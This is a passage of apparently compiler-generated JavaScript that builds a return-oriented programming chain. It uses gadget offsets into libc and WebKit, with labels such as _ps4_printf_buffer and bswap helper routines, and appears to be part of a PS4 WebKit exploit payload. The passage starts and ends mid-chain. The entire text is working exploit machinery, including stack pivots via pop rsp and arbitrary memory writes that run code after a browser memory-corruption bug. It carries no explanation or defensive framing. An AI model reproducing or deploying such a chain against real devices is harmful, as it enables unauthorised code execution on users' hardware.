set_gadget(libc_base+788575,); //pop rax
//L2440:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+164176, //L2442
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L2441:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2442:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+164224, //L2443
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2443:
db([0, 0]); // 0x0
set_gadgets([
libc_base+788575, //pop rax
//L2444:
ropchain+128, //_ps4_printf_buffer
webkit_base+2997875, //mov [rax], rcx
libc_base+793877, //pop rsi
ropchain+164296, //L2446
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2446:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+164376, //L2448
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2448:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+164432, //L2450
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2450:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+164560, //L2452
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+164544, //L2451
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2451:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2452:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+164656, //L2453
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+164672, //L2454
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2453:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2454:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+164784, //L2455
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+164768, //L2456
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2456:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2455:
db([0, 0]); // 0x0
//L2397:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
write_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+166112, //L2457
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L2457:
db([0, 0]); // 0x0
//___bswap64_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+166184, //L2458
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2458:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+166280, //L2461
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+166312, //L2463
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L2461:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2462:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2463:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+166400, //L2464
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+166416, //L2465
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2464:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2465:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+166536, //L2468
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+166552, //L2469
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+166520, //L2467
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2467:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2468:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2469:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+166648, //L2470
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+166664, //L2471
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2470:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2471:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+166776, //L2472
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+166760, //L2473
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2473:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2472:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+166864, //L2475
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+166848, //L2474
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2474:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2475:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+166960, //L2476
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+166976, //L2477
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2476:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2477:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+167088, //L2478
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167072, //L2479
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2479:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2478:
db([0, 0]); // 0x0
//___bswap32_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+167160, //L2480
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2480:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+167256, //L2483
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+167288, //L2485
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L2483:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2484:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2485:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+167376, //L2486
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+167392, //L2487
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2486:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2487:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+167544, //L2489
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167576, //L2492
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+167560, //L2490
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+167528, //L2491
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2491:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2489:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2490:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2492:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+167736, //L2496
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+167704, //L2493
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+167688, //L2495
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2495:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2493:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2494:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L2496:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+167864, //L2498
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167880, //L2499
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+167848, //L2497
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2497:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2498:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2499:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+167976, //L2500
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+167992, //L2501
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2500:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2501:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168104, //L2502
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168088, //L2503
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2503:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2502:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+168192, //L2505
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+168176, //L2504
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2504:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2505:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168288, //L2506
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168304, //L2507
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2506:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2507:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168416, //L2508
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+168400, //L2509
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2509:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2508:
db([0, 0]); // 0x0
//___bswap16_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+168488, //L2510
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2510:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+168584, //L2513
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+168616, //L2515
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L2513:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2514:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2515:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+168704, //L2516
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+168720, //L2517
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2516:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2517:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+168880, //L2522
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+168848, //L2519
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+168832, //L2520
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2520:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2519:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2521:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2522:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+168936, //L2523
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2523:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+169040, //L2525
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+169072, //L2527
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+169056, //L2526
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2525:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2526:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2527:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+169232, //L2531
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+169200, //L2528
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+169184, //L2530
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2530:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2528:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2529:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2531:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+169336, //L2533
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+169320, //L2532
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2532:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2533:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2534:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2535:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+169544, //L2538
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+169512, //L2537
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2537:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2536:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2538:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+169648, //L2540
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+169632, //L2539
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2539:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2540:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+169728, //L2541
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2541:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2542:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+169832, //L2544
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+169848, //L2545
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2544:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2545:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+170008, //L2550
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+169976, //L2547
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+169960, //L2548
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2548:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2547:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2549:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2550:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+170064, //L2551
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2551:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+170168, //L2553
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+170200, //L2555
webkit_base+7438103, //mov [rsi], rax
